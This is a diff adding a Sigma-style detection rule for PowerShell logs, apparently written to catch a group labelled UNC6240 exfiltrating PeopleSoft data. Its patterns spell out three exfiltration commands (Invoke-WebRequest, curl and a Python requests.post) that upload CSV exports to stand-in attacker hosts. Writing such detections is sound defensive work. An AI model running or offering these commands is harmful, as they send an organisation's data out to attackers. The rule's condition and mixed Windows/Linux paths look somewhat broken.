@@ -1,0 +1,14 @@
+title: UNC6240 Data Exfiltration via Scripting on PeopleSoft Server
+logsource:
+  product: windows
+  service: powershell
+detection:
+  script_block:
+    - 'Invoke-WebRequest -Uri "http://*.shinyhunters*" -Method POST -Body (Get-Content "C:\psdata\*.csv")'
+    - 'curl http://*.exfil[.]biz -X POST --data-binary @/opt/ps/data/export.csv'
+    - 'python -c "import requests; requests.post(\"http://*.exfil[.]biz\", files={\"file\": open(\"/opt/ps/data/export.csv\", \"rb\")})"'
+  file_path:
+    - '*\psdata\*.csv'
+    - '*\psdata\*.xml'
+    - '/opt/ps/data/export.csv'
+condition: all of them
